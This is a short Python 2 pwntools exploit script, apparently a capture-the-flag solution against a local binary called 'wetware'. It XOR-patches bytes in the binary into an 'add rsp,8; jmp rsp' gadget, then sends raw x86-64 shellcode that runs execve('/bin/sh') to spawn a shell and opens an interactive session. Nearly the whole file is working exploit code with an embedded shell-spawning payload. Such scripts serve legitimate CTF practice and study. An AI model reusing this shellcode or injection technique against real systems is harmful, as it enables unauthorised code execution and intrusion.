#!/usr/bin/env python2
from pwn import *
from IPython import embed

p = process("./wetware")

def main():
    #add rsp,8; jmp rsp:
    jump = "\x48\x83\xc4\x08\xff\xe4"
    #bytes currently in the binary:
    xist = "\xd2\x6f\x65\x6d\x6f\x26"
    patch = bytearray([ord(i[0]) ^ ord(i[1]) for i in zip(jump, xist)])

    payload = ""
    #payload += "mnemonic"
    payload += str(patch)
    payload += "ic"
    

    payload += "\x48\x31\xc0\x48\x83\xec\x70\x50\x48\x89\xe2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x52\x48\x89\xe2\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

    print(p.read())

    print("pausing for input...")
    raw_input()

    p.sendline(payload)

    embed(banner1="")

if __name__ == "__main__":
    main()
